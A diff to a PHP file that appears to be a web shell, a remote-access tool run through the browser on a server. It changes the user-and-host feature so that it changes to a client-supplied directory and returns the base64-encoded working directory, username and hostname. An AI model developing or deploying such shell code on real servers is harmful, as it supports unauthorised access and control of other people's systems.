@@ -215,29 +215,30 @@ LOGO;
      *
      * @return array
      */
-    public function featureUserHost()
+    public function featureUserHost($cwd)
     {
+        chdir($cwd);
         $result = [
             'username' => '',
             'hostname' => '',
+            'cwd' => base64_encode(getcwd())
         ];
-
 
         if ($this->isRunningWindows()) {
             $username = getenv('USERNAME');
             if ($username !== false) {
-                $result['username'] = $username;
+                $result['username'] = base64_encode($username);
             }
         } else {
             $pwuid = posix_getpwuid(posix_geteuid());
             if ($pwuid !== false) {
-                $result['username'] = $pwuid['name'];
+                $result['username'] = base64_encode($pwuid['name']);
             }
         }
 
         $hostname = gethostname();
         if ($hostname !== false) {
-            $result['hostname'] = $hostname;
+            $result['hostname'] = base64_encode($hostname);
         }
 
         return $result;
@@ -304,7 +305,7 @@ HTML;
                 $response = $this->featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
                 break;
             case 'userhost':
-                $response = $this->featureUserHost();
+                $response = $this->featureUserHost($_POST['cwd']);
                 break;
         }
 
